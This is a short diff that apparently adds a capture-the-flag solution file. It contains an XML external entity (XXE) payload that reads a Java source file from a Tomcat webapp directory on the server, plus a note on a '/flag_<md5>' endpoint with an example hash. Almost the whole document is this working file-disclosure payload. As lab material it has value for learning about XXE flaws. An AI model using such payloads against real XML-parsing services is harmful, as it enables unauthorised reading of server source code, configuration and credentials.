@@ -1,0 +1,17 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE root [
+<!ELEMENT query ANY >
+<!ENTITY xxe SYSTEM "file:///tomcat/webapps/ROOT/WEB-INF/classes/Flag.java" >
+]>
+<root>
+<query>&xxe;</query>
+</root>
+
+
+
+
+endpoint:
+/flag_hash
+hash is replaced with an md5sum
+/flag_ec15369935728e44e72cba6c04debb47
+
